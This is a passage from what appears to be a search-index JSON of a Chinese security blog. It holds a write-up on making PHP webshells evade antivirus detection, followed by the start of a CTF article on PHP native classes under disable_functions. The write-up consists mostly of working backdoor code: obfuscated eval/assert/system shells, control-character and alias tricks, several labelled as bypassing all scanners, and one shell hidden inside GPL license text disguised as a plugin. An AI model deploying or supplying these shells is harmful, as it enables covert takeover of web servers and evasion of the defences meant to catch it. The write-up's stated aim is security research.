\u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3","title":"\u53e6\u7c7b\u7684\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53d8\u5f62\u4e0e\u4f2a\u88c5","text":"\u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * @author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?>","title":"\u53d8\u5f62\u4e0e\u4f2a\u88c5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u7b26\u53f7\u5e72\u6270","text":"\u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26","title":"\u7b26\u53f7\u5e72\u6270"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u522b\u540d\u91cd\u547d\u540d","text":"\u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"\u522b\u540d/\u91cd\u547d\u540d"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/","tags":["disable_functions","php"],"text":"\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0b\u7684php\u539f\u751f\u7c7b\u5229\u7528 # \u6253ctf\u65f6\u6709\u65f6\u5019\u4f1a\u9047\u5230\u4e00\u4e9b\u6bd4\u8f83\u53d8\u6001\u7684disable functions\uff0c\u628a\u8bb8\u591a\u5e38\u89c1\u7684\u51fd\u6570\u90fd\u7981\u7528\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u5199\u5165\u6587\u4ef6/\u8bfb\u53d6\u6587\u4ef6\u7b49\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e00\u4e9bphp\u539f\u751f\u7c7b\u7684\u5229\u7528 \u4e00\u4e2adisable functions\u4f8b\u5b50\u5982\u4e0b(\u4ece\u67d0\u9053\u9898\u76ee\u62a0\u4e0b\u6765\u7684): zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, define, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, 